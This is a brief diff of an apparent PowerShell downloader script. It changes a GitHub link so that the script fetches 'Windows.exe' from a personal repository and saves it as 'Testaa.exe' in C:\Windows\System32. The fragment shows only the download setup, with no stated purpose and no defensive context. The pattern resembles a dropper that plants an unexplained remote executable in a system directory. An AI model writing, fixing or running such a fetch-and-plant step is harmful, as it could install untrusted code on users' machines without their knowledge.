@@ -1,4 +1,4 @@
-$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/blob/main/Windows.exe"
+$exeUrl = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
 $exePath = "C:\Windows\System32\Testaa.exe"
 
 Write-Host "Downloading..." -ForegroundColor Cyan
